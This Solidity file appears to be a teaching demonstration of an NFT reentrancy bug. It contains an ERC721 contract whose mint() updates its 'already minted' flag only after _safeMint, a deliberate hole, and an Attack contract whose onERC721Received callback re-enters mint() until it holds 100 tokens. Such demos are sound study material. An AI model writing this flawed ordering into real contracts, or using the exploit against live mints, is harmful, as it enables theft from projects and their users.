// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;

    constructor() ERC721("Reentry NFT", "ReNFT"){}

    function mint() payable external {
        require(mintedAddress[msg.sender] == false);
        totalSupply++;
        _safeMint(msg.sender , totalSupply);
        mintedAddress[msg.sender] = true;
    }

}

contract Attack is IERC721Receiver {
    NFTReentrancy public nft;

    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }

    function attack() external {
        nft.mint();
    }

    function onERC721Received(address , address , uint256 , bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 100) {
            nft.mint();
        }
        return this.onERC721Received.selector;            
    }
}